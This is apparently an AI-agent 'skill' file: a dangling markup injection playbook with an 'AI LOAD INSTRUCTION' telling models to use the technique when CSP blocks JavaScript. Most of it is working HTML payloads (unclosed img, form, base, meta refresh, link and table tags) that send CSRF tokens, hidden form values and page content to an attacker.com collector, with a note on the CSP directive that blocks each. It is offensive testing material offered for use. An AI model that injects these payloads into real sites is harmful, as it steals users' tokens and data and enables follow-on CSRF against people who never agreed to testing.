---
name: dangling-markup-injection
description: 0. RELATED ROUTING
when-to-use: >-
  Dangling markup injection playbook. Use when HTML injection is possible but
  JavaScript execution is blocked (CSP, sanitizer strips event handlers, WAF
  blocks script tags) — exfiltrate CSRF tokens, session data, and page content
  by injecting unclosed HTML tags that capture subsequent page content.
---

# SKILL: Dangling Markup Injection — Exfiltration Without JavaScript

> **AI LOAD INSTRUCTION**: Covers dangling markup exfiltration via unclosed img/form/base/meta/link/table tags, what can be stolen (CSRF tokens, pre-filled form values, sensitive content), browser-specific behavior, and combinations with other attacks. Base models often overlook this technique entirely when CSP blocks scripts, jumping to "not exploitable" — dangling markup is the answer.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when full XSS is possible (no need for dangling markup)
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when CSP blocks JS execution — dangling markup bypasses script restrictions
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) when dangling markup steals CSRF tokens for subsequent CSRF attacks
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF enables HTML injection in HTTP response
- web-cache-deception when dangling markup + cache poisoning amplifies the attack

---

## 1. WHEN TO USE DANGLING MARKUP

You need dangling markup when ALL of these are true:

1. You have an HTML injection point (reflected or stored)
2. JavaScript execution is blocked:
   - CSP blocks inline scripts and event handlers
   - Sanitizer strips `<script>`, `onerror`, `onload`, etc.
   - WAF blocks known XSS patterns
3. The page contains sensitive data AFTER your injection point:
   - CSRF tokens
   - Pre-filled form values (email, username, API keys)
   - Session identifiers in hidden fields
   - Sensitive user content

**Core insight**: You don't need JavaScript to exfiltrate data — you just need the browser to make a request that includes the data in the URL.

---

## 2. CORE TECHNIQUE

Inject an unclosed HTML tag with a `src`, `href`, `action`, or similar attribute pointing to your server. The unclosed attribute quote "consumes" all subsequent page content until the browser finds a matching quote.

```html
Page before injection:
  <div>Hello USER_INPUT</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>

Injected payload:
  <img src="https://attacker.com/collect?

Resulting HTML:
  <div>Hello <img src="https://attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
  ...rest of page until next matching quote (")...
```

The browser interprets everything from `https://attacker.com/collect?` until the next `"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `attacker.com`.

---

## 3. EXFILTRATION VECTORS

### 3.1 Image Tag (Most Common)

```html
<!-- Double-quote context -->
<img src="https://attacker.com/collect?

<!-- Single-quote context -->
<img src='https://attacker.com/collect?

<!-- Backtick context (IE only, legacy) -->
<img src=`https://attacker.com/collect?
```

The browser sends a GET request to `attacker.com` with all consumed content as query parameters.

**Blocked by**: `img-src` CSP directive

### 3.2 Form Action Hijack

```html
<form action="https://attacker.com/collect">
<button>Click to continue</button>
<!--
```

If the page has form elements after the injection point, the next `</form>` closes the attacker's form. All input fields between become part of the attacker's form → submitted to attacker on user interaction.

**Blocked by**: `form-action` CSP directive

**Trick**: Even without user interaction, if there's an existing submit button or JavaScript auto-submit, the form submits automatically.

### 3.3 Base Tag Hijack

```html
<base href="https://attacker.com/">
```

All subsequent relative URLs on the page resolve to attacker's server:
- `<script src="/js/app.js">` → loads `https://attacker.com/js/app.js`
- `<a href="/profile">` → links to `https://attacker.com/profile`
- `<form action="/submit">` → submits to `https://attacker.com/submit`

**Blocked by**: `base-uri` CSP directive

### 3.4 Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?
```

Redirects the entire page to attacker's server with consumed page content in the URL.

**Blocked by**: `navigate-to` CSP directive (rarely set), some browsers ignore meta refresh when CSP is present.

### 3.5 Link/Stylesheet Exfiltration

```html
<link rel="stylesheet" href="https://attacker.com/collect?
```

Browser requests the URL as a CSS resource, leaking consumed content.

**Blocked by**: `style-src` CSP directive

### 3.6 Table Background (Legacy)

```html
<table background="https://attacker.com/collect?
```

Works in older browsers that support the `background` attribute on table elements.

**Blocked by**: `img-src` CSP directive

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。

> 📎 **参考文档说明**：本 skill 转自上游开源仓库，以下参考文档**未随本库分发**：`SKILL.md`。相关主题的要点已保留在本文对应描述中；如需展开内容，请按正文关键词在库内 grep 或自行检索。
